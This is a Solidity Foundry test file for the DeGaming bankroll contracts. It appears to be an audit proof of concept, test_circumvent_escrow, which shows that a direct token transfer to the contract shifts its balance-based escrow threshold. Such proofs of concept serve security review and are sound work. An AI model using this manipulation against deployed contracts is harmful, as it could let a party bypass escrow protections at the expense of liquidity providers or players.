// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/* OpenZeppelin contract */
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

/* DeGaming Contracts */
import {Bankroll} from "src/Bankroll.sol";
import {DGBankrollManager} from "src/DGBankrollManager.sol";
import {DGBankrollFactory} from "src/DGBankrollFactory.sol";
import {DGEscrow} from "src/DGEscrow.sol";

/* DeGaming Libraries */
import {DGErrors} from "src/libraries/DGErrors.sol";
import {DGDataTypes} from "src/libraries/DGDataTypes.sol";

/* Mock Contracts */
import {MockToken} from "test/mock/MockToken.sol";
import "forge-std/console2.sol";

contract BankrollTest is Test {
    address admin;
    address operator;
    address lpOne;
    address lpTwo;
    address player;
    address owner;
    uint256 maxRisk;
    uint256 threshold;
    TransparentUpgradeableProxy public bankrollProxy;

    ProxyAdmin public proxyAdmin;

    DGBankrollFactory public dgBankrollFactory;
    DGBankrollManager public dgBankrollManager;
    DGEscrow public dgEscrow;
    Bankroll public bankroll;
    MockToken public token;

    function setUp() public {
        admin = address(0x1);
        operator = address(0x2);
        lpOne = address(0x3);
        lpTwo = address(0x4);
        player = address(0x5);
        owner = address(0x6);
        maxRisk = 10_000;
        threshold = 10_000;

        dgBankrollFactory = new DGBankrollFactory();

        dgBankrollManager = new DGBankrollManager(admin);
        token = new MockToken("token", "MTK");

        dgEscrow = new DGEscrow(1 weeks, address(dgBankrollManager));

        proxyAdmin = new ProxyAdmin();

        bankrollProxy = new TransparentUpgradeableProxy(
            address(new Bankroll()),
            address(proxyAdmin),
            abi.encodeWithSelector(
                Bankroll.initialize.selector,
                admin,
                address(token),
                address(dgBankrollManager),
                address(dgEscrow),
                owner,
                maxRisk,
                threshold
            )
        );

        bankroll = Bankroll(address(bankrollProxy));

        token.mint(lpOne, 1_000_000e6);
        token.mint(lpTwo, 1_000_000e6);
        token.mint(admin, 1_000_000e6);

        dgBankrollManager.addOperator(operator);
        dgBankrollManager.approveBankroll(address(bankroll), 0);
        dgBankrollManager.setOperatorToBankroll(address(bankroll), operator);
    }

    function test_circumvent_escrow() public {
        vm.startPrank(lpOne);
        token.approve(address(bankroll), 1_000_000e6);
        bankroll.depositFunds(500_000e6);
        vm.stopPrank();

        // bankroll has 1_000_000
        assertEq(token.balanceOf(address(bankroll)), 500_000e6);
        assertEq(bankroll.liquidity(), 500_000e6);

        // Set the escrow threshold to 5000 (50%)
        vm.startPrank(admin);
        bankroll.changeEscrowThreshold(5000);
        uint256 escrowThresholdBefore = bankroll.getEscrowThreshold();
        console2.log("Escrow Threshold before: ", bankroll.getEscrowThreshold());
        assertEq(escrowThresholdBefore, 250_000e6);
        vm.stopPrank();

        // Manipulate the escrow threshold
        vm.startPrank(lpOne);
        token.transfer(address(bankroll), 500e6);
        uint256 escrowThresholdAfter = bankroll.getEscrowThreshold();
        console2.log("Escrow Threshold after: ", bankroll.getEscrowThreshold());
        assertEq(escrowThresholdAfter, 250_250e6);
        vm.stopPrank();

        // The player has successfully manipulated the escrow threshold
        assertNotEq(escrowThresholdBefore, escrowThresholdAfter);
    }
}
